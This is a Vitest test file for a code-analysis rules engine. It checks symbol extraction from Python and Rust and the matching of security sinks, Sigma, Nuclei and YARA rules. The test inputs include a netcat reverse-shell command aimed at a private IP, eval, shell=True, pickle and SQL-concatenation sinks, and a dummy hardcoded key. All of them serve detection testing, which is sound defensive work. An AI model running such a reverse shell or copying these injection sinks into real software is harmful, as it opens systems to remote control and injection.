import { describe, it, expect } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { SymbolRulesEngine } from '../src/memory/rules-engine.js';

describe('SymbolRulesEngine: Decomposed Multi-Language, Sigma, Nuclei & YARA Rules', () => {
  const engine = new SymbolRulesEngine();

  it('extracts Python symbols along with route, auth, and dataclass decorators', () => {
    const pythonCode = `
@bp.route('/api/users/<user_id>', methods=['GET'])
@auth_required(role='admin')
def get_user_profile(user_id: str) -> dict:
    """Fetch user profile."""
    return db.query(user_id)

@dataclass
class UserConfig:
    retries: int = 3
`;
    const symbols = engine.extractSymbols(pythonCode, 'python', 'app/routes.py');
    expect(symbols.length).toBeGreaterThanOrEqual(2);

    const fnSymbol = symbols.find((s) => s.name === 'get_user_profile');
    expect(fnSymbol).toBeDefined();
    expect(fnSymbol?.kind).toBe('function');
    expect(fnSymbol?.decorators).toEqual([
      "@bp.route('/api/users/<user_id>', methods=['GET'])",
      "@auth_required(role='admin')",
    ]);
    expect(fnSymbol?.metadata?.httpMethod).toBe('GET');
    expect(fnSymbol?.metadata?.routePath).toBe('/api/users/<user_id>');
    expect(fnSymbol?.metadata?.authRole).toBe('admin');

    const classSymbol = symbols.find((s) => s.name === 'UserConfig');
    expect(classSymbol).toBeDefined();
    expect(classSymbol?.kind).toBe('class');
    expect(classSymbol?.decorators).toEqual(['@dataclass']);
  });

  it('extracts Rust ownership modifiers, traits, and crate-level visibility', () => {
    const rustCode = `
pub(crate) struct BufferPool {
    inner: Arc<Mutex<Vec<u8>>>,
}

impl BufferPool {
    pub fn acquire(&mut self) -> Result<Box<[u8]>, Error> {
        let handle = self.inner.lock().unwrap();
        Ok(handle.clone().into_boxed_slice())
    }
}
`;
    const symbols = engine.extractSymbols(rustCode, 'rust', 'src/pool.rs');
    const structSym = symbols.find((s) => s.name === 'BufferPool');
    expect(structSym).toBeDefined();
    expect(structSym?.kind).toBe('struct');
    expect(structSym?.visibility).toBe('pub(crate)');

    const methodSym = symbols.find((s) => s.name === 'acquire');
    expect(methodSym).toBeDefined();
    expect(methodSym?.kind).toBe('method');
    expect(methodSym?.metadata?.isMutSelf).toBe(true);
    expect(methodSym?.metadata?.returnsBox).toBe(true);
  });

  it('detects dangerous security sinks across languages', () => {
    const tsCode = `const out = eval(untrustedInput);`;
    const pyCode = `subprocess.check_output(cmd, shell=True)`;

    const tsSinks = engine.detectSinks(tsCode, 'javascript');
    expect(tsSinks).toContainEqual(
      expect.objectContaining({
        sinkType: 'eval_injection',
        line: 1,
      })
    );

    const pySinks = engine.detectSinks(pyCode, 'python');
    expect(pySinks).toContainEqual(
      expect.objectContaining({
        sinkType: 'command_injection',
        line: 1,
      })
    );
  });

  it('evaluates decomposed Sigma detection rules', () => {
    const code = `const res = child_process.execSync('whoami');`;
    const matches = engine.matchSigmaRules(code);
    expect(matches.length).toBeGreaterThanOrEqual(1);
    expect(matches.some((m) => m.id === 'sigma-command-injection')).toBe(true);
  });

  it('evaluates decomposed Nuclei matcher templates', () => {
    const code = `const key = 'api_key = "1234567890abcdef1234"';`;
    const matches = engine.matchNucleiTemplates(code);
    expect(matches.length).toBeGreaterThanOrEqual(1);
    expect(matches.some((m) => m.id === 'nuclei-hardcoded-secrets')).toBe(true);
  });

  it('evaluates decomposed YARA signature rules with line tracking and CRLF support', () => {
    const payload = `nc -e /bin/sh 10.0.0.1 4444`;
    const matches = engine.matchYaraRules(payload);
    expect(matches.length).toBeGreaterThanOrEqual(1);
    expect(matches.some((m) => m.name === 'ReverseShellPayload')).toBe(true);
    expect(matches[0].line).toBe(1);

    const multilinePayload = `line1\r\nline2\r\nnc -e /bin/sh 10.0.0.1 4444\r\nline4`;
    const multilineMatches = engine.matchYaraRules(multilinePayload);
    const target = multilineMatches.find((m) => m.name === 'ReverseShellPayload');
    expect(target).toBeDefined();
    expect(target?.line).toBe(3);
  });

  it('evaluates binary-level YARA rules with hex magic bytes and symbols', () => {
    const elfBinary = '\x7fELF\x02\x01\x01\x00' + '...some_bytes...' + 'memfd_create' + '...';
    const matches = engine.matchYaraRules(elfBinary);
    expect(matches.some((m) => m.name === 'Symbolic_Library_Loader_Patterns')).toBe(true);
  });

  it('supports multiline Python decorators across line breaks', () => {
    const pythonCode = `
@bp.route(
    '/api/v2/items',
    methods=['POST']
)
@auth_required(
    role='editor'
)
def create_item(data: dict) -> dict:
    return {}
`;
    const symbols = engine.extractSymbols(pythonCode, 'python', 'app/items.py');
    const fn = symbols.find((s) => s.name === 'create_item');
    expect(fn).toBeDefined();
    expect(fn?.decorators?.length).toBe(2);
    expect(fn?.metadata?.httpMethod).toBe('POST');
    expect(fn?.metadata?.routePath).toBe('/api/v2/items');
    expect(fn?.metadata?.authRole).toBe('editor');
  });

  it('extracts Rust multiline fn signatures and survives comments/strings with braces', () => {
    const rustCode = `
impl BufferPool {
    pub fn acquire_with_timeout(
        &mut self,
        timeout: u64,
    ) -> Result<Box<[u8]>, Error> {
        let fake = "}; }";
        // fake comment }
        /* block comment } */
        Ok(Box::new([]))
    }

    pub fn secondary(&self) -> bool {
        true
    }
}
`;
    const symbols = engine.extractSymbols(rustCode, 'rust', 'src/pool.rs');
    const fn1 = symbols.find((s) => s.name === 'acquire_with_timeout');
    expect(fn1).toBeDefined();
    expect(fn1?.kind).toBe('method');
    expect(fn1?.metadata?.isMutSelf).toBe(true);
    expect(fn1?.metadata?.returnsBox).toBe(true);

    const fn2 = symbols.find((s) => s.name === 'secondary');
    expect(fn2).toBeDefined();
    expect(fn2?.kind).toBe('method');
  });

  it('populates column index and matches updated sink regexes', () => {
    const py = `data = pickle.loads(payload)`;
    const pySinks = engine.detectSinks(py, 'python');
    expect(pySinks).toContainEqual(
      expect.objectContaining({
        sinkType: 'deserialization',
        line: 1,
        column: 8,
      })
    );

    const js = `const sub = child_process.exec('ls');`;
    const jsSinks = engine.detectSinks(js, 'javascript');
    expect(jsSinks).toContainEqual(
      expect.objectContaining({
        sinkType: 'command_injection',
        line: 1,
        column: 13,
      })
    );

    const go = `res, err := db.Query("SELECT * FROM users WHERE name = " + name)`;
    const goSinks = engine.detectSinks(go, 'go');
    expect(goSinks).toContainEqual(
      expect.objectContaining({
        sinkType: 'sql_injection',
        line: 1,
        column: 13,
      })
    );
  });

  it('tolerates parsed.language and sink pattern in directory loading', () => {
    const tmpRules = path.join(os.tmpdir(), `test-rules-${Date.now()}-${Math.random().toString(36).substring(2, 6)}`);
    const langDir = path.join(tmpRules, 'languages');
    fs.mkdirSync(langDir, { recursive: true });
    fs.writeFileSync(
      path.join(langDir, 'custom.yaml'),
      `language: custom\nextensions:\n  - .custom\nsinks:\n  - type: custom_sink\n    pattern: "\\\\bcustom_eval\\\\("`
    );

    const customEngine = new SymbolRulesEngine({ rulesDir: tmpRules });
    const sinks = customEngine.detectSinks('custom_eval(input)', 'custom');
    expect(sinks).toHaveLength(1);
    expect(sinks[0].sinkType).toBe('custom_sink');

    fs.rmSync(tmpRules, { recursive: true, force: true });
  });
});
